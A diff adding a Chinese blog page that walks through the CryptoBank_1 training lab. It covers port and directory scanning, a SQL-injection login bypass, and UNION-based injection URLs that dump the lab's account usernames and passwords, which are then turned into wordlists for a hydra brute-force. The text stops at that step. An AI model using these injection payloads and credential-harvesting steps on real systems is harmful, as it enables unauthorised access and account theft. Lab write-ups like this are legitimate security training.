@@ -1,0 +1,834 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="I3eg1nner">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="CryptoBank_1靶机信息收集123456┌──(kali㉿kali)-[~&#x2F;Documents&#x2F;CryptoBank_1]└─$ sudo nmap --min-rate 10000 -p- 192.168.1.104PORT   STATE SERVICE22&#x2F;tcp open  ssh80&#x2F;tcp open  http  123456789101112131415161718┌──(k">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CryptoBank_1靶机">
+<meta property="og:url" content="https://i3eg1nner.github.io/2023/10/67e28830d268.html">
+<meta property="og:site_name" content="I3eg1nner&#39;s blog">
+<meta property="og:description" content="CryptoBank_1靶机信息收集123456┌──(kali㉿kali)-[~&#x2F;Documents&#x2F;CryptoBank_1]└─$ sudo nmap --min-rate 10000 -p- 192.168.1.104PORT   STATE SERVICE22&#x2F;tcp open  ssh80&#x2F;tcp open  http  123456789101112131415161718┌──(k">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/0f35f72a5e05a2a910f58640ea308de4_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/dbe36262dc83ee9fedba21a1ac75c257_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/52aa5eb64b08da3c92242d05150277ed_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/5aa17f20c5a39d611d5b4e14c6f70ab3_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/766c61e07d89672222776350dedf017f_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/b3c8c886dff029136ba1d7d068f96100_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/b0b88875c7c0dd0d7c58b75a9cbb8888_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/f86833afbb2d2236c9437f42ec842ed6_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/f65e196624ce01168b158f06b745b7d3_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/ffa69b3e17d7ad4a67408fcf6c4bb941_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/66f1143b45dfb7af4d1f7d340ecc4035_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/3533b7ddd2867f1e88e030db87f73b63_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/3786362d3c043aa8e42692f61fcc2c50_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/dc6831d65be5ea1ff87450bfe5da16a5_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/66c83b921018cb46102c2320b10eaf04_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/132d7e1a5f8eb95e26d0250d487835b3_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/0081b3fadb2174d8ad5e3e190fbb272f_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/4d01ede6d019305676cd0367a3f8c84c_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/6fe431d23fccd2d28befd3fba67555ca_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/bfeb0a301396c4d878e1b2d6c25babfa_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/861876911fd6c4e2a7d3996226464c27_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/b9469dec28fbf3426642718b49ab157b_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/daa0a4dd8c1ff46ebc08e0d63b113f0c_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/2f6fade69b268de917f4d8b87cec9382_MD5.png">
+<meta property="article:published_time" content="2023-10-18T04:56:16.000Z">
+<meta property="article:modified_time" content="2023-10-20T02:10:58.523Z">
+<meta property="article:author" content="I3eg1nner">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://i3eg1nner.github.io/pic/0f35f72a5e05a2a910f58640ea308de4_MD5.png">
+  
+  
+  
+  <title>CryptoBank_1靶机 - I3eg1nner&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"i3eg1nner.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>I3eg1nner</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="CryptoBank_1靶机"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-10-18 12:56" pubdate>
+          2023年10月18日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          23k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          192 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">CryptoBank_1靶机</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="CryptoBank-1靶机"><a href="#CryptoBank-1靶机" class="headerlink" title="CryptoBank_1靶机"></a>CryptoBank_1靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/CryptoBank_1]<br>└─$ sudo nmap --min-rate 10000 -p- 192.168.1.104<br><br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/CryptoBank_1]<br>└─$ sudo nmap -sT -sV -sC -O -p22,80 192.168.1.104<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   2048 7f:4e:59:<span class="hljs-built_in">df</span>:b7:55:49:cf:d3:12:2d:19:01:05:43:f7 (RSA)<br>|   256 5e:1b:37:98:ab:c7:e6:ee:5f:f8:<span class="hljs-built_in">df</span>:43:14:de:28:4e (ECDSA)<br>|_  256 8e:a9:90:9f:6e:51:b1:c7:26:ea:07:ac:69:28:b3:1c (ED25519)<br>80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))<br>|_http-server-header: Apache/2.4.29 (Ubuntu)<br>|_http-title: CryptoBank<br>MAC Address: 08:00:27:1D:F7:35 (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS  <br></code></pre></td></tr></table></figure>
+
+<h2 id="Web-查看"><a href="#Web-查看" class="headerlink" title="Web 查看"></a>Web 查看</h2><p>查看网页发现</p>
+<p><img src="/pic/0f35f72a5e05a2a910f58640ea308de4_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>添加域名与 IP 的映射后，继续查看</p>
+<p><img src="/pic/dbe36262dc83ee9fedba21a1ac75c257_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>发现了人名和职位信息，作为字典的备选</p>
+<p><img src="/pic/52aa5eb64b08da3c92242d05150277ed_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>邮箱跳转的信息中虽然是 404 网页，但依然可以作为字典的备选.</p>
+<h2 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h2><p>目录爆破一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/CryptoBank_1]<br>└─$ sudo dirsearch -u http://cryptobank.local<br><br><br>Target: http://cryptobank.local/<br>           <br>[01:05:15] 301 -  321B  - /assets  -&gt;  http://cryptobank.local/assets/      <br>[01:05:15] 200 -    2KB - /assets/                                          <br>[01:05:20] 401 -  463B  - /development/                                     <br>[01:05:24] 200 -   33KB - /index.html                                       <br>[01:05:24] 200 -  447KB - /index.js                                         <br>[01:05:25] 200 -   85KB - /info.php                                         <br>[01:05:35] 403 -  281B  - /server-status                                    <br>[01:05:35] 403 -  281B  - /server-status/<br><br>Task Completed<br></code></pre></td></tr></table></figure>
+
+<p><code>info.php</code> 是 phpinfo 文件（且暴露了文件包含的风险），<code>index.js</code> 是混淆后的 js 文件，看起来是用于定时清除 cookie 之类的功能。对于这种文件，发现了一个好用的网站 <a target="_blank" rel="noopener" href="https://beautifier.io/">Online JavaScript beautifier</a></p>
+<p><img src="/pic/5aa17f20c5a39d611d5b4e14c6f70ab3_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>/development/</code> 目录会弹登录框，默认网页中有个登录入口，是目录爆破工具没爆出来的，先看看网页吧</p>
+<p><img src="/pic/766c61e07d89672222776350dedf017f_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="登录框-SQL-注入"><a href="#登录框-SQL-注入" class="headerlink" title="登录框 SQL 注入"></a>登录框 SQL 注入</h2><p>登录框，尝试 SQL 注入，万能密码无效。burp 抓包看看，尝试 burp 自带的 SQL 注入字典进行 fuzz</p>
+<p><img src="/pic/b3c8c886dff029136ba1d7d068f96100_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>记得勾选自动重定向（settings 中）</p>
+<p><img src="/pic/b0b88875c7c0dd0d7c58b75a9cbb8888_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>如果直接使用 <code>1 or 7=7</code> 登录还是会失败。我们看下请求包</p>
+<p><img src="/pic/f86833afbb2d2236c9437f42ec842ed6_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>这里 pass 被 URL 编码为了 <code>1+or+7%3D7</code>，而 Intruder 中则是 <code>1%20or%207%3d7</code></p>
+<p><img src="/pic/f65e196624ce01168b158f06b745b7d3_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们这次直接抓包改包，成功登录.</p>
+<p><img src="/pic/ffa69b3e17d7ad4a67408fcf6c4bb941_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>接下来依次查看各个功能</p>
+<p><img src="/pic/66f1143b45dfb7af4d1f7d340ecc4035_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>在 loans 界面看到其 URL 比较特别，可能存在 SQL 注入</p>
+<p><img src="/pic/3533b7ddd2867f1e88e030db87f73b63_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>验证了猜想，确实存在 SQL 注入，使用 <code>order by</code> 确认了列数，使用 <code>select 1,2,3</code> 确认了回显位置</p>
+<p><img src="/pic/3786362d3c043aa8e42692f61fcc2c50_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>接下来就是经典的 MySQL 注入了，顺便发现了自己最精彩出现的一个手误的情况：</p>
+<p>schema_name 老是写成 schemea.name，要记住 <code>.</code> 是下一级的意思，就不会那么容易写错了</p>
+<figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">//数据库名</span><br><span class="hljs-comment">http://cryptobank</span><span class="hljs-string">.</span><span class="hljs-comment">local/trade/view_loans</span><span class="hljs-string">.</span><span class="hljs-comment">php?search=&quot; union select 1</span><span class="hljs-string">,</span><span class="hljs-comment">database()</span><span class="hljs-string">,</span><span class="hljs-comment">3</span><span class="hljs-literal">--</span> <span class="hljs-comment">#</span><br><span class="hljs-comment">//cryptobank</span><br><br><span class="hljs-comment">//所有库名</span><br><span class="hljs-comment">http://cryptobank</span><span class="hljs-string">.</span><span class="hljs-comment">local/trade/view_loans</span><span class="hljs-string">.</span><span class="hljs-comment">php?search=&quot; union select 1</span><span class="hljs-string">,</span><span class="hljs-comment">group_concat(schema_name)</span><span class="hljs-string">,</span><span class="hljs-comment">3 from information_schema</span><span class="hljs-string">.</span><span class="hljs-comment">schemata</span><span class="hljs-literal">--</span> <span class="hljs-comment">#</span><br><span class="hljs-comment">//information_schema</span><span class="hljs-string">,</span><span class="hljs-comment">cryptobank</span><span class="hljs-string">,</span><span class="hljs-comment">mysql</span><span class="hljs-string">,</span><span class="hljs-comment">performance_schema</span><span class="hljs-string">,</span><span class="hljs-comment">sys</span><br><br><span class="hljs-comment">//cryptobank库中的表名</span><br><span class="hljs-comment">http://cryptobank</span><span class="hljs-string">.</span><span class="hljs-comment">local/trade/view_loans</span><span class="hljs-string">.</span><span class="hljs-comment">php?search=&quot; union select 1</span><span class="hljs-string">,</span><span class="hljs-comment">group_concat(table_name)</span><span class="hljs-string">,</span><span class="hljs-comment">3 from information_schema</span><span class="hljs-string">.</span><span class="hljs-comment">tables where table_schema=&#x27;cryptobank&#x27;</span><span class="hljs-literal">--</span> <span class="hljs-comment">#</span><br><span class="hljs-comment">//accounts</span><span class="hljs-string">,</span><span class="hljs-comment">comments</span><span class="hljs-string">,</span><span class="hljs-comment">loans</span><br><br><span class="hljs-comment">//accounts表中的列名</span><br><span class="hljs-comment">http://cryptobank</span><span class="hljs-string">.</span><span class="hljs-comment">local/trade/view_loans</span><span class="hljs-string">.</span><span class="hljs-comment">php?search=&quot; union select 1</span><span class="hljs-string">,</span><span class="hljs-comment">group_concat(column_name)</span><span class="hljs-string">,</span><span class="hljs-comment">3 from information_schema</span><span class="hljs-string">.</span><span class="hljs-comment">columns where table_schema=&#x27;cryptobank&#x27;</span><span class="hljs-literal">--</span> <span class="hljs-comment">#</span><br><span class="hljs-comment">//id_account</span><span class="hljs-string">,</span><span class="hljs-comment">username</span><span class="hljs-string">,</span><span class="hljs-comment">password</span><span class="hljs-string">,</span><span class="hljs-comment">balance</span><span class="hljs-string">,</span><span class="hljs-comment">USER</span><span class="hljs-string">,</span><span class="hljs-comment">HOST</span><span class="hljs-string">,</span><span class="hljs-comment">CURRENT_CONNECTIONS</span><span class="hljs-string">,</span><span class="hljs-comment">TOTAL_CONNECTIONS</span><br><br><span class="hljs-comment">//表中内容</span><br><span class="hljs-comment">http://cryptobank</span><span class="hljs-string">.</span><span class="hljs-comment">local/trade/view_loans</span><span class="hljs-string">.</span><span class="hljs-comment">php?search=&quot; union select 1</span><span class="hljs-string">,</span><span class="hljs-comment">group_concat(id_account</span><span class="hljs-string">,</span><span class="hljs-comment">&#x27;</span><span class="hljs-literal">--</span><span class="hljs-comment">&#x27;</span><span class="hljs-string">,</span><span class="hljs-comment">username</span><span class="hljs-string">,</span><span class="hljs-comment">&#x27;</span><span class="hljs-literal">--</span><span class="hljs-comment">&#x27;</span><span class="hljs-string">,</span><span class="hljs-comment">password</span><span class="hljs-string">,</span><span class="hljs-comment">&#x27;</span><span class="hljs-literal">--</span><span class="hljs-comment">&#x27;</span><span class="hljs-string">,</span><span class="hljs-comment">balance)</span><span class="hljs-string">,</span><span class="hljs-comment">3 from accounts</span><span class="hljs-literal">--</span> <span class="hljs-comment">#</span><br><span class="hljs-comment">//1</span><span class="hljs-literal">--</span><span class="hljs-comment">williamdelisle</span><span class="hljs-literal">--</span><span class="hljs-comment">gFG7pqE5cn</span><span class="hljs-literal">--</span><span class="hljs-comment">87536</span><span class="hljs-string">,</span><span class="hljs-comment">2</span><span class="hljs-literal">--</span><span class="hljs-comment">juliusthedeveloper</span><span class="hljs-literal">--</span><span class="hljs-comment">wJWm4CgV26</span><span class="hljs-literal">--</span><span class="hljs-comment">34421</span><span class="hljs-string">,</span><span class="hljs-comment">3</span><span class="hljs-literal">--</span><span class="hljs-comment">bill</span><span class="hljs-string">.</span><span class="hljs-comment">w</span><span class="hljs-literal">--</span><span class="hljs-comment">3Nrc2FYJMe</span><span class="hljs-literal">--</span><span class="hljs-comment">26321</span><span class="hljs-string">,</span><span class="hljs-comment">4</span><span class="hljs-literal">--</span><span class="hljs-comment">johndl33t</span><span class="hljs-literal">--</span><span class="hljs-comment">NqRF4W85yf</span><span class="hljs-literal">--</span><span class="hljs-comment">1375</span><span class="hljs-string">,</span><span class="hljs-comment">5</span><span class="hljs-literal">--</span><span class="hljs-comment">mrbitcoin</span><span class="hljs-literal">--</span><span class="hljs-comment">LxZjkK87nu</span><span class="hljs-literal">--</span><span class="hljs-comment">434455</span><span class="hljs-string">,</span><span class="hljs-comment">6</span><span class="hljs-literal">--</span><span class="hljs-comment">spongebob</span><span class="hljs-literal">--</span><span class="hljs-comment">3mwZd896Me</span><span class="hljs-literal">--</span><span class="hljs-comment">8531</span><span class="hljs-string">,</span><span class="hljs-comment">7</span><span class="hljs-literal">--</span><span class="hljs-comment">dreadpirateroberts</span><span class="hljs-literal">--</span><span class="hljs-comment">7HwAEChFP9</span><span class="hljs-literal">--</span><span class="hljs-comment">733456</span><span class="hljs-string">,</span><span class="hljs-comment">8</span><span class="hljs-literal">--</span><span class="hljs-comment">deadbeef</span><span class="hljs-literal">--</span><span class="hljs-comment">6X7DnLF5pG</span><span class="hljs-literal">--</span><span class="hljs-comment">4324</span><span class="hljs-string">,</span><span class="hljs-comment">9</span><span class="hljs-literal">--</span><span class="hljs-comment">buzzlightyear</span><span class="hljs-literal">--</span><span class="hljs-comment">LnBHvEhmw3</span><span class="hljs-literal">--</span><span class="hljs-comment">2886</span><span class="hljs-string">,</span><span class="hljs-comment">10</span><span class="hljs-literal">--</span><span class="hljs-comment">tim</span><span class="hljs-literal">--</span><span class="hljs-comment">zm2gBcaxd3</span><span class="hljs-literal">--</span><span class="hljs-comment">857</span><span class="hljs-string">,</span><span class="hljs-comment">11</span><span class="hljs-literal">--</span><span class="hljs-comment">patric</span><span class="hljs-literal">--</span><span class="hljs-comment">x8CRvHqgPp</span><span class="hljs-literal">--</span><span class="hljs-comment">1</span><span class="hljs-string">,</span><span class="hljs-comment">12</span><span class="hljs-literal">--</span><span class="hljs-comment">notanirsagent</span><span class="hljs-literal">--</span><span class="hljs-comment">8hPx2Zqn4b</span><span class="hljs-literal">--</span><span class="hljs-comment">777</span><br></code></pre></td></tr></table></figure>
+
+<p>实际上这里点击图片还会发现一个注入点</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://cryptobank.local/trade/applying_loan.php?loan_id=1<br></code></pre></td></tr></table></figure>
+
+<p>亲测可以注入，不妨自己试一试。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://cryptobank.local/trade/applying_loan.php?loan_id=1 union <span class="hljs-keyword">select</span> 1,2,3 --+<br></code></pre></td></tr></table></figure>
+
+<h2 id="hydra-http-登录爆破"><a href="#hydra-http-登录爆破" class="headerlink" title="hydra http 登录爆破"></a>hydra http 登录爆破</h2><p>将注入得到信息写入 sqllab 文件，并使用 awk 来获得用户名和密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/CryptoBank_1]<br>└─$ <span class="hljs-built_in">cat</span> sqllab | awk -F <span class="hljs-string">&#x27;,&#x27;</span> <span class="hljs-string">&#x27;&#123; for(i=1; i&lt;=NF; i++) print $i &#125;&#x27;</span> | awk -F <span class="hljs-string">&#x27;--&#x27;</span> <span class="hljs-string">&#x27;&#123;print $2 &#125;&#x27;</span> &gt;usernames<br><br>┌──(kali㉿kali)-[~/Documents/CryptoBank_1]<br>└─$ <span class="hljs-built_in">cat</span> usernames<br>williamdelisle<br>juliusthedeveloper<br>bill.w<br>johndl33t<br>mrbitcoin<br>spongebob<br>dreadpirateroberts<br>deadbeef<br>buzzlightyear<br>tim<br>patric<br>notanirsagent<br></code></pre></td></tr></table></figure>
+
+<p>再将我们之前在网页中收集到的用户信息也写入用户名字典</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">juliusbook</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">billwhite</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">johndoe</span><br><span class="hljs-keyword"></span>william.d<br><span class="hljs-keyword">julius.b</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">john.d</span><br></code></pre></td></tr></table></figure>
+
+<p>然后提取密码信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/CryptoBank_1]<br>└─$ <span class="hljs-built_in">cat</span> passwords<br>gFG7pqE5cn<br>wJWm4CgV26<br>3Nrc2FYJMe<br>NqRF4W85yf<br>LxZjkK87nu<br>3mwZd896Me<br>7HwAEChFP9<br>6X7DnLF5pG<br>LnBHvEhmw3<br>zm2gBcaxd3<br>x8CRvHqgPp<br>8hPx2Zqn4b<br></code></pre></td></tr></table></figure>
+
+<p>使用爆破工具进行爆破，直接使用 hydra，提示需要添加参数，不能直接扔进来 http 链接</p>
